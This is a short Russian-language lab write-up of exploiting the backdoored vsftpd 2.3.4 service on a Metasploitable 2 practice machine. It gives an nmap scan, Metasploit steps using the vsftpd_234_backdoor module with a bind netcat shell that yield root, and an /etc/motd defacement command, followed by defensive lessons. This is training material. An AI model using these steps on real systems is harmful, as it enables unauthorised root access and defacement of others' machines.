# Metasploitable 2 — vsftpd 2.3.4

**Платформа:** Metasploitable 2
**ОС:** Linux
**Дата:** 2026-09-12

## Recon
nmap -sV 192.168.1.107

PORT     STATE  SERVICE    VERSION
21/tcp   open   ftp        vsftpd 2.3.4

## Vulnerability
Версия vsftpd 2.3.4 - содержит backdoor.
При отправке смайлика - :), в username открывается shell на порту 6200.

## Exploitation
1. msfconsole
2. search vsftpd
3. use exploit/unix/ftp/vsftpd_234_backdoor
4. set payload cmd/unix/bind_netcat
5. set RHOSTS 192.168.1.107
6. exploit
7. whoami --> root
8. Получил root права.

## Post-Explotation
Оставил сообщение-след  в /etc/motd:
/bin/echo "Hacked By mrLSQ1" > /etc/motd
При входе в Metasplotable 2 - будет отображатся текст.

## Privesc
Не нужен, root получен сразу же через backdoor.

## Flags
Не содержит флагов, но доступ подтвержден.

## Lessons Learned
- Всегда искать версии с помощью -sV, они критичны.
- Старое ПО --> всегда уязвимость.
- Пост-Эксплуатация - демострация доступа.
- Обязательно нужно закрывать ftp доступ, чтобы посторонние не смогли удаленно - управлять устройством.

 